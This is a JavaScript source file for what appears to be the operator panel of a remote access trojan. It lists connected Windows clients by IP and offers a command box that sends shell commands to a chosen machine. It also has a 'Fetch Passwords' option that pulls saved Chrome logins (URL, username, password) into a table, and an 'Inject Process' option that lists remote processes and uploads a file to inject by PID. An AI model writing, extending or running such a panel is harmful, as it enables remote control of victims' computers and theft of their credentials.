import { Loading } from './Loader.js';

  
let chatVisible = false;
let selectedClient = null;



async function displayClients() {
  const response = await fetch('/listShellConnections', {
    method: 'GET'
  });
  const clients = await response.json();
  const clientsContainer = document.getElementById('clients-container');

  for (let id of clients) {
    console.log(`rec id: ${id}`);
    const clientDiv = document.createElement('div');
    clientDiv.className = 'client';


    const optionBar = document.createElement('i');
    optionBar.className = "fa-solid fa-ellipsis-vertical"
    clientDiv.appendChild(optionBar)
    optionBar.addEventListener("click",() => DisplaySettings(clientDiv,id))

    const clientIcon = document.createElement('i');
    clientIcon.className = 'fa-brands fa-windows';
    clientIcon.style.color = '#49da3e';
    clientIcon.addEventListener('click', () => onClientClick(id, clientIcon));
    clientDiv.appendChild(clientIcon);

    const clientIp = document.createElement('div');
    clientIp.className = 'client-ip';
    clientIp.textContent = id.split(':')[0];
    clientDiv.appendChild(clientIp);

    clientsContainer.appendChild(clientDiv);
  }

 
  function onClientClick(id, clientIcon) {
    const icons = clientsContainer.querySelectorAll('.client img');
    icons.forEach(icon => {
      icon.classList.remove('selected');
    });

    if (selectedClient !== id) {
      clientIcon.classList.add('selected');
      handleChat(id);
      chatVisible = true;
    } else {
      toggleChatVisibility();
    }

    selectedClient = chatVisible ? id : null;
  }
}


function toggleChatVisibility() {
  const containerChat = document.getElementById('ChatContainer');
  chatVisible = !chatVisible;
  containerChat.style.display = chatVisible ? 'block' : 'none';
}

function handleChat(id) {
  const buttonSend = document.getElementById('sentButton')
  const containerChat = document.getElementById('ChatContainer');
  containerChat.style.display = 'block'
  const chatBody = document.querySelector('.chat-body');
  const txtInput = document.getElementById('txtInput');
  const chatHeader = document.querySelector('.chat-header');
  chatHeader.innerHTML = "";
  const ipElement = document.createElement('div');
  ipElement.className = 'title';
  ipElement.textContent = `Client Id: ${id}`;
  chatHeader.appendChild(ipElement);


  txtInput.addEventListener("keydown", (event) => {
    if (event.key === "Enter" && !event.shiftKey) {
      event.preventDefault();
      renderUserMessage();
    } else if (event.key === "Enter" && event.shiftKey) {
      event.preventDefault();
      const cursorPosition = txtInput.selectionStart;
      txtInput.value = txtInput.value.slice(0, cursorPosition) + "\n" + txtInput.value.slice(cursorPosition);
      txtInput.selectionEnd = cursorPosition + 1;

      resizeInput();

    }
  });

  buttonSend.addEventListener("click", () => {
      renderUserMessage();
  });

  txtInput.addEventListener("input", () => {
    resizeInput();
  });

  function resizeInput() {
    const previousHeight = txtInput.style.height ? parseInt(txtInput.style.height.slice(0, -2)) : 0;
  
    const rowsLen = Math.max(txtInput.value.split('\n').length, 1);
    if (rowsLen > 2) {
      txtInput.rows = rowsLen;
    }
    const newHeight = parseInt(txtInput.style.height.slice(0, -2));
    const bottomAdjustment = newHeight - previousHeight;
    txtInput.style.bottom = (parseInt(txtInput.style.bottom.slice(0, -2)) - bottomAdjustment) + "px";
    txtInput.scrollTop = txtInput.scrollHeight;
  }
  

  const renderUserMessage = () => {  
    const userInput = txtInput.value
    renderMessageEle(userInput, "user");
    txtInput.value = "";
    renderChatbotResponse(userInput);
  };

  const renderChatbotResponse = async (userInput) => {
    try {
      const response = await fetch("/send_message", {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({message:{command: userInput}, id: id})
      });

      const data = await response.json();
      const chatbotResponse = data.message;
      renderMessageEle(chatbotResponse);
    } catch (error) {
      console.error("Error:", error);
    }
  };

  const renderMessageEle = (txt, type) => {
    let className = "user-message";
    if (type !== "user") {
      className = "chatbot-message";
    }
    const messageEle = document.createElement("div");
    const txtNode = document.createTextNode(txt);
    messageEle.classList.add(className);
    messageEle.append(txtNode);
    chatBody.append(messageEle);
    setScrollPosition();
  };

  const setScrollPosition = () => {
    if (chatBody.scrollHeight > 0) {
      chatBody.scrollTop = chatBody.scrollHeight;
    }
  };
}

function PasswordOption(e, id){
  e.preventDefault();
  toggleAll("");
  fetch('/passwordsTableIndex')
    .then(response => response.text())
    .then(html => {
      const modal = document.createElement('div');
      modal.innerHTML = html;
      modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
      modal.id = "PasswordMainTable"
      document.body.appendChild(modal);
      
      FetchPasswords(id).then(data => {
        console.log(data);
        let profileSelection = document.querySelector('#profile-selection');
        for(let profile in data){
            console.log(profile);
            let option = document.createElement('option');
            option.text = profile;
            option.value = profile;
            profileSelection.add(option);
        }

        profileSelection.addEventListener('change', function() {
          let selectedProfile = this.value;
          let profileData = data[selectedProfile];
          let tbody = document.querySelector('#profileTable tbody');
          while (tbody.firstChild) {
              tbody.removeChild(tbody.firstChild);
          }
          profileData.forEach(function(record) {
            if (record.password.length > 0 || record.user.length > 0){
                tbody.insertAdjacentHTML('beforeend', `<tr>
                    <td class="url">${record.url}</td>
                    <td class="created">${record.created}</td>
                    <td class="last">${record.last}</td>
                    <td class="user">${record.user}</td>
                    <td class="password">${record.password}</td>
                    </tr>`
                );
            }
          });
        });

        profileSelection.dispatchEvent(new Event('change'));
      });
    })
    .catch(error => console.error('Error:', error));
}


function InjectOption(e, id){
  e.preventDefault();
  toggleAll("");
  fetch('/ProcessTableIndex')
    .then(response => response.text())
    .then(html => {
      const modal = document.createElement('div');
      modal.innerHTML = html;
      modal.style = "position: absolute;left: 5%;width: 90%;top: 0%;z-index: 2;color: white;"
      modal.id = "ProcessMainTable"
      document.body.appendChild(modal);

      FetchProcesess(id).then(data => {
        console.log(data);
        let tbody = document.querySelector('#ProcessesToinject tbody');
        if (tbody) {
          while (tbody.firstChild) {
            tbody.removeChild(tbody.firstChild);
          }
        }        
        for(let i of data){  
          console.log(i.length)  

          let row = document.createElement('tr');
          row.innerHTML = `
            <td class="ProcessNameInjectoption">${i[0]}</td>
            <td class="PidInjectoption">${i[1]}</td>
            <td class="Memoryusegoption">${i[2]}</td>
            <td class="OwnerInjectoption">${i[3]}</td>
          `;

          let td = document.createElement('td');
          td.className = "WasInjectoption";
          let icon = document.createElement('i');
          icon.className = "fa-solid fa-microchip";
          td.appendChild(icon);

          if (i[4] == "y"){
            icon.style.color = '#0f0';
          } else {
            icon.addEventListener('click', function() {
              SendInjectByPid(i[1],icon);
            });
          }

          row.appendChild(td);
          tbody.appendChild(row);
        }
      });
    })
    .catch(error => console.error('Error:', error));
}


function SendInjectByPid(pid,icon){
  UploadProcessToInject();
  icon.style.color = '#0f0';
}

function DisplaySettings(clientDiv, id) {
  let menu = document.getElementById('settings-menu');

  const options = [
      { name: "Fetch Passwords", action: (e) => PasswordOption(e, id) },
      { name: "Inject Process", action: (e) => InjectOption(e, id) }
  ];

  if (!menu) {
      menu = document.createElement('div');
      menu.id = "settings-menu";
      menu.style.display = "none";

      const ul = document.createElement('ul');
      ul.style = "margin-bottom: 0px;";

      for (let i = 0; i < options.length; i++) {
          const li = document.createElement('li');
          li.style = "padding: 3px;";

          const optionElement = document.createElement('a');
          optionElement.href = "#";
          optionElement.textContent = options[i].name;
          optionElement.style = "padding: 5px 5px 5px 5px;";
          optionElement.addEventListener('click', options[i].action);
          li.appendChild(optionElement);

          ul.appendChild(li);
      }

      menu.appendChild(ul);
      clientDiv.appendChild(menu);
  }

  if (menu.style.display === 'none') {
      menu.style.display = 'block';
  } else {
      menu.style.display = 'none';
  }
}



function FetchPasswords(id){
  const loader = new Loading()
  loader.DisplayLoading()
  return fetch("/send_message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({message:{command: "5df297c2f2da83a8b45cfd012fbf9b3c",type:"Passwords",web:"chrome"}, id: id})
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(res => {
    loader.EndLoading()
    return res.message;
  })
  .catch(error => {
    console.error('An error occurred while fetching passwords:', error);
  });
}

function FetchProcesess(id){
  const loader = new Loading()
  loader.DisplayLoading()
  return fetch("/send_message", {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({message:{command: "be425fd08e9ea24230bac47493228ada"}, id: id})
  })
  .then(response => {
    if (!response.ok) {
      throw new Error(`HTTP error! status: ${response.status}`);
    }
    return response.json();
  })
  .then(res => {
    loader.EndLoading()
    return res.message;
  })
  .catch(error => {
    console.error('An error occurred while fetching passwords:', error);
  });
}



function toggleAll(exclude){
  const array = ["ChatContainer","settings-menu","UploadFileDialogBox"];
  array.forEach(element => {
    if (element != exclude){
      let el = document.getElementById(element);
      if(el) {
        el.style.display = 'none';
      }
    }
  });
}


function UploadProcessToInject(){
    let mainDiv = document.getElementById("UploadFileDialogBox")
    mainDiv.style.display = 'block'
    let container = document.querySelector('.UploadFileContainer');
    let fileList = document.getElementById('SelectedFileName');
    let fileUpload = document.getElementById('file_uploadOption');

    function updateFileList() {
        let files = fileUpload.files;
        if (files.length > 0) {
            fileList.textContent = files[files.length - 1].name;
        }
    }fileUpload.addEventListener('change', updateFileList);

  container.addEventListener('dragover', function(e) {
    e.preventDefault();
    container.classList.add('dragover');
  });

  container.addEventListener('dragleave', function(e) {
    e.preventDefault();
    container.classList.remove('dragover');
  });

  container.addEventListener('drop', function(e) {
    e.preventDefault();
    container.classList.remove('dragover');
    fileUpload.files = e.dataTransfer.files;
    updateFileList();
  });

  document.querySelector('.UploadFileBtn').addEventListener('click', function() {
    let files = fileUpload.files;
    if (files.length === 0) {
        console.log("No files selected");
        return;
    }
    mainDiv.style.display = 'none'
    let file = files[0];
    let reader = new FileReader();

    reader.onload = function(event) {
        let base64String = event.target.result.split(',')[1];
        console.log(base64String);
    };

    reader.onerror = function(event) {
        console.log("Error reading file: " + event.target.error);
    };

    reader.readAsDataURL(file);
  });
}

displayClients()